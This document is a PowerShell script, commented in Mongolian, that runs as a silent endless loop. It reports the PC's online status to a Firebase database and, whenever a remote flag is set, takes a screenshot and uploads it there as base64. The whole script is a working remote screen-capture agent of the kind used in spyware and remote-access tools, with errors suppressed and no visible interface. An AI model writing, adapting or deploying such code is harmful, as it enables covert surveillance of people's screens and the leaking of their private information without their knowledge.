# ==================== CONFIGURATION ====================
$FirebaseURL = "https://zaq-pay-46916-default-rtdb.asia-southeast1.firebasedatabase.app/"
$SecretKey = "ШинэТүлхүүр123" # <-- Өөрийн хүссэн түлхүүр (жишээ нь: ss123)
$PCName = $env:COMPUTERNAME
# =======================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
    try {
        # 1. Онлайн төлөв шинэчлэх (last_seen)
        $Now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        $OnlineURL = "$FirebaseURL/pcs/$SecretKey/$PCName.json"
        $OnlineBody = @{
            online = $true
            last_seen = $Now
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $OnlineURL -Method Patch -Body $OnlineBody -ContentType "application/json"

        # 2. Дэлгэцийн зураг авах хүсэлт шалгах
        $ReqURL = "$FirebaseURL/pcs/$SecretKey/$PCName/screen_request.json"
        $Request = Invoke-RestMethod -Uri $ReqURL -Method Get -ErrorAction SilentlyContinue

        if ($Request -and $Request.active -eq $true) {
            # 3. Дэлгэцийн зураг авах
            $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
            $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
            $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size)

            $MemoryStream = New-Object System.IO.MemoryStream
            $Encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
            $EncoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
            $EncoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 60)
            $Bitmap.Save($MemoryStream, $Encoder, $EncoderParams)

            $ImageBytes = $MemoryStream.ToArray()
            $Base64 = [Convert]::ToBase64String($ImageBytes)

            # 4. Firebase руу зураг илгээх
            $DataURL = "$FirebaseURL/pcs/$SecretKey/$PCName/screen_data.json"
            $Body = @{
                image = $Base64
                timestamp = $Now
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $DataURL -Method Put -Body $Body -ContentType "application/json"

            # 5. Хүсэлтийг унтраах
            $OffBody = @{ active = $false } | ConvertTo-Json
            Invoke-RestMethod -Uri $ReqURL -Method Put -Body $OffBody -ContentType "application/json"

            $Graphics.Dispose()
            $Bitmap.Dispose()
            $MemoryStream.Dispose()
        }
    } catch { }
    Start-Sleep -Seconds 2
}